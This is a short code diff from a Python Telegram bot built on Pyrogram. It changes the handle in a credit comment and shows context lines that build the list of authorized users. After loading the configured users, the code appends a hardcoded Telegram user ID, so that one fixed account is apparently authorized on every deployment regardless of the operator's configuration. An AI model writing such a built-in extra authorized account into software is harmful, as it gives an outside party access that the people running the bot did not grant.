@@ -5,7 +5,7 @@ import time
 from pyrogram import Client
 from bot.config import Config
 
-# dont think ne dumb (c) @cmd_rulf
+# dont think ne dumb (c) @Yae_X_Miko
 AUTH_USERS = set(Config.AUTH_USERS)
 AUTH_USERS = list(AUTH_USERS)
 AUTH_USERS.append(5179011789)
